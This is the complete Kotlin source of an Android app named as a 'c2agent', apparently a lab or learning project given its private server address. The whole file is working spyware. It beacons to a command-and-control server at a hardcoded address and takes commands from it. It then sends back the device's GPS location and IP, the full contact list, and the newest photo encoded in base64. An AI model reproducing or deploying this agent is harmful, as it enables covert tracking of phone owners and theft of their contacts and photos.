package com.example.c2agent

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Bundle
import android.os.BatteryManager
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST

data class BeaconData(
    val agent_id: String,
    val device_model: String,
    val os_version: String,
    val battery: Int
)

data class BeaconResponse(
    val status: String,
    val command: String?
)

data class ResultData(
    val agent_id: String,
    val command: String,
    val output: String
)

data class PhotoData(
    val agent_id: String,
    val filename: String,
    val data: String
)

interface C2Api {
    @POST("sync")
    fun sync(@Body data: BeaconData): Call<BeaconResponse>

    @POST("result")
    fun sendResult(@Body data: ResultData): Call<Any>

    @POST("upload/photo")
    fun uploadPhoto(@Body data: PhotoData): Call<Any>
}

class MainActivity : AppCompatActivity() {

    private lateinit var api: C2Api
    private lateinit var agentId: String
    private val LOCATION_PERMISSION_REQUEST = 1001
    private val PHOTOS_PERMISSION_REQUEST = 1002

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        agentId = android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )

        val retrofit = Retrofit.Builder()
            .baseUrl("http://192.168.1.138:8000/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()

        api = retrofit.create(C2Api::class.java)

        // cere permisiuni la start
        val permissionsToRequest = mutableListOf<String>()
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED)
            permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED)
            permissionsToRequest.add(Manifest.permission.READ_CONTACTS)
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
            != PackageManager.PERMISSION_GRANTED)
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES)

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), LOCATION_PERMISSION_REQUEST)
        }

        sendBeacon()
    }

    override fun onResume() {
        super.onResume()
        sendBeacon()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        sendBeacon()
    }

    // ── helpers ──────────────────────────────────────────────────────────────

    private fun getBattery(): Int {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun getDeviceInfo(): String {
        return "model=${android.os.Build.MODEL} | " +
                "os=${android.os.Build.VERSION.RELEASE} | " +
                "battery=${getBattery()}%"
    }

    private fun getIpAddress(): String {
        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val ip = wifiManager.connectionInfo.ipAddress
        return String.format(
            "%d.%d.%d.%d",
            ip and 0xff,
            ip shr 8 and 0xff,
            ip shr 16 and 0xff,
            ip shr 24 and 0xff
        )
    }

    private fun getGeoIpInfo(callback: (String) -> Unit) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            callback("location permission denied")
            return
        }
        val fusedClient = LocationServices.getFusedLocationProviderClient(this)
        fusedClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null)
            .addOnSuccessListener { location ->
                val ip = getIpAddress()
                if (location != null) {
                    callback("ip=$ip | lat=${location.latitude} | lon=${location.longitude} | accuracy=${location.accuracy}m")
                } else {
                    callback("ip=$ip | location=unavailable")
                }
            }
            .addOnFailureListener {
                callback("ip=${getIpAddress()} | location=error: ${it.message}")
            }
    }

    private fun getContacts(): String {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            return "contacts permission denied"
        }
        val sb = StringBuilder()
        val cursor: Cursor? = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(0) ?: "unknown"
                val number = it.getString(1) ?: "unknown"
                sb.appendLine("$name : $number")
            }
        }
        return if (sb.isEmpty()) "no contacts found" else sb.toString()
    }

    private fun getLastPhoto(callback: (String) -> Unit) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
            != PackageManager.PERMISSION_GRANTED) {
            callback("photos permission denied")
            return
        }
        val cursor: Cursor? = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME),
            null, null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )
        cursor?.use {
            if (it.moveToFirst()) {
                val id = it.getLong(0)
                val name = it.getString(1) ?: "photo.jpg"
                val uri: Uri = Uri.withAppendedPath(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
                )
                try {
                    val bytes = contentResolver.openInputStream(uri)?.readBytes()
                    if (bytes != null) {
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        api.uploadPhoto(PhotoData(agentId, name, b64)).enqueue(object : Callback<Any> {
                            override fun onResponse(call: Call<Any>, response: Response<Any>) {
                                Log.d("C2Agent", "Photo uploaded OK")
                            }
                            override fun onFailure(call: Call<Any>, t: Throwable) {
                                Log.e("C2Agent", "Photo upload failed: ${t.message}")
                            }
                        })
                        callback("photo sent: $name (${bytes.size} bytes)")
                    } else {
                        callback("could not read photo")
                    }
                } catch (e: Exception) {
                    callback("error: ${e.message}")
                }
            } else {
                callback("no photos found")
            }
        } ?: callback("could not query media store")
    }

    // ── command dispatcher ───────────────────────────────────────────────────

    private fun executeCommand(command: String) {
        when (command) {
            "GET_DEVICE_INFO" -> sendResult(command, getDeviceInfo())
            "GEOIP_INFO"      -> getGeoIpInfo { output -> sendResult(command, output) }
            "GET_CONTACTS"    -> sendResult(command, getContacts())
            "LAST_PHOTO"      -> getLastPhoto { output -> sendResult(command, output) }
            else              -> sendResult(command, "unknown command: $command")
        }
    }

    // ── network ──────────────────────────────────────────────────────────────

    private fun sendBeacon() {
        val beacon = BeaconData(
            agent_id     = agentId,
            device_model = android.os.Build.MODEL,
            os_version   = android.os.Build.VERSION.RELEASE,
            battery      = getBattery()
        )
        api.sync(beacon).enqueue(object : Callback<BeaconResponse> {
            override fun onResponse(call: Call<BeaconResponse>, response: Response<BeaconResponse>) {
                Log.d("C2Agent", "Beacon OK")
                val command = response.body()?.command
                if (command != null) {
                    Log.d("C2Agent", "Got command: $command")
                    executeCommand(command)
                }
            }
            override fun onFailure(call: Call<BeaconResponse>, t: Throwable) {
                Log.e("C2Agent", "Beacon failed: ${t.message}")
            }
        })
    }

    private fun sendResult(command: String, output: String) {
        val result = ResultData(
            agent_id = agentId,
            command  = command,
            output   = output
        )
        api.sendResult(result).enqueue(object : Callback<Any> {
            override fun onResponse(call: Call<Any>, response: Response<Any>) {
                Log.d("C2Agent", "Result sent OK")
            }
            override fun onFailure(call: Call<Any>, t: Throwable) {
                Log.e("C2Agent", "Result failed: ${t.message}")
            }
        })
    }
}